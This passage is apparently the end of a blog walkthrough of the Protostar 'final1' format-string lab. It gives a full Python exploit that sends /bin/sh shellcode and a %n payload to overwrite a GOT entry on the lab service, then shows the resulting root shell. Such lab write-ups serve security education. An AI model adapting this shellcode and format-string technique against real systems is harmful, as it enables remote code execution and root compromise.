<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waitForLine</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">                c = s.recv(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">'$'</span>):</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">"127.0.0.1"</span>,<span class="number">2994</span>))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00"</span></span><br><span class="line"></span><br><span class="line">name =  sock.getpeername()</span><br><span class="line"></span><br><span class="line">l = len(shellcode) +  len(<span class="string">"Login from  as [] with password ["</span>) + len(name[<span class="number">0</span>] + <span class="string">":"</span> + str(name[<span class="number">1</span>])) + <span class="number">9</span></span><br><span class="line">username = <span class="number">0x804a220</span></span><br><span class="line">got = <span class="number">0x804a174</span></span><br><span class="line"></span><br><span class="line">firstpad = (username &amp; <span class="number">0x000ffff</span>) - l</span><br><span class="line">secondpad = ((username &gt;&gt; <span class="number">16</span>) | <span class="number">0x10000</span>) - firstpad - l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">waitForLine(sock)</span><br><span class="line">sock.send(<span class="string">"username "</span> + shellcode + <span class="string">"\n"</span>)</span><br><span class="line">waitForLine(sock)</span><br><span class="line">sock.send(<span class="string">"login "</span> + <span class="string">"A"</span>  + struct.pack(<span class="string">"I"</span>, got) + struct.pack(<span class="string">"I"</span>, got + <span class="number">2</span>) + <span class="string">"%"</span> + str(firstpad) + <span class="string">"x"</span> + <span class="string">"%25$n"</span>  + <span class="string">"%"</span> + str(secondpad) + <span class="string">"x"</span> + <span class="string">"%26$n"</span> +  <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">tn = telnetlib.Telnet()</span><br><span class="line">tn.sock = sock</span><br><span class="line">tn.interact()</span><br></pre></td></tr></table></figure>

<p>Finally, we can use <code>telnetlib</code> to interact with the shell that we’ve created:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/tmp$ python final1-a.py </span><br><span class="line"> login failed</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenge"><span class="toc-number">3.</span> <span class="toc-text">Challenge</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&text=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&is_video=false&description=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Binary Exploitation - Protostar - Format String&body=Check out this article: https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&name=Binary Exploitation - Protostar - Format String&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&t=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Winston Zhao
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
